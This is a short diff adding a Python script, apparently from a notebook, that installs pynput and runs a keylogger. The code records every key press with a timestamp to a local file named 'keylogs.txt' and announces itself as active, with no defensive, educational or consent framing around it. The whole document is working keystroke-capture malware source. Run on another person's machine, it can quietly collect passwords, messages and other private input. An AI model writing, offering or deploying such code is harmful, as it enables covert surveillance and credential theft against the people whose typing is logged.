@@ -1,0 +1,34 @@
+!pip install pynput
+
+from pynput.keyboard import Listener
+import logging
+
+# Specify the name of the log file for storing keystrokes
+log_file_name = "keylogs.txt"
+
+# Configure logging to save keystrokes with timestamps
+logging.basicConfig(filename=log_file_name, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def record_keystroke(key):
+    """
+    This function records each key press in the log file.
+    It takes the pressed key as an argument.
+    """
+    try:
+        # Format the key press to be more readable
+        key_as_string = str(key).replace("'", "")
+        logging.info(key_as_string)  # Log the formatted key press
+    except Exception as error:
+        print(f"An error occurred while logging the key: {error}")
+
+def start_keylogger():
+    """
+    This function starts the keylogger and keeps it running,
+    listening for key press events.
+    """
+    with Listener(on_press=record_keystroke) as listener:
+        listener.join()  # Wait for the listener to stop
+
+if __name__ == "__main__":
+    print("Keylogger is now active. Press Ctrl+C to stop recording.")
+    start_keylogger()
